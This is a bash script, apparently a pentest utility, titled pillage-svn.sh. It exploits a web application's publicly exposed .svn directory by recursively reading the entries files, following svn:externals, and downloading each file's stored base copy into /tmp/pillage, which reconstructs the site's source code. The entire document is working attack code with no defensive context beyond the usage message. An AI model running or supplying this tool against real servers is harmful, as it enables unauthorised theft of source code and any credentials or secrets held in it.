#!/bin/bash

CURL='curl --create-dirs -s'
OUTDIR='/tmp/pillage'

if [ ! $# -eq 1 ];then
  echo 'usage: pillage-svn.sh http://example.com/webapp/'
  echo 'Where you discovered http://example.com/webapp/.svn/'
  echo '-- @lanjelot'
  exit 2
fi

BASEURL=$1

dldir()
{
local curdir
local fname
local ftype

curdir=$1

$CURL "$BASEURL/${curdir}/.svn/entries" -o "$OUTDIR/$curdir/entries"

# pillage all externals
if grep -q 'svn:externals' "$OUTDIR/$curdir/entries"; then
  $CURL "$BASEURL/${curdir}/.svn/dir-prop-base" -o "$OUTDIR/$curdir/dir-prop-base"
  while read dname dpath; do
    [[ -z $dname ]] && continue
    [[ $dpath =~ '://' ]] && continue
    dldir "$curdir/$dpath"
  done < <(cat "$OUTDIR/$curdir/dir-prop-base" | sed -n '/^svn:externals$/,/^$/p' | tail -n +3)
fi

# pillage from base
while read fname ftype; do

echo "Getting $curdir/$fname"

case "$ftype" in
'dir') dldir "$curdir/$fname"
;;

'file')

#test -f "$OUTDIR/$curdir/$fname" && continue
#grep -q -E '\.(jpg|png|gif|css|js)$' <<< "$fname" && continue
$CURL "$BASEURL/$curdir/.svn/text-base/$fname.svn-base" -o "$OUTDIR/$curdir/$fname"
;;

*) echo "[WARN] Found nothing in $curdir/$fname, is it really empty?"
;;
esac

done < <(cat "$OUTDIR/${curdir}/entries" | awk '/^\f$/ {getline a; getline b; print a,b }' | sort -u)

}

dldir ''
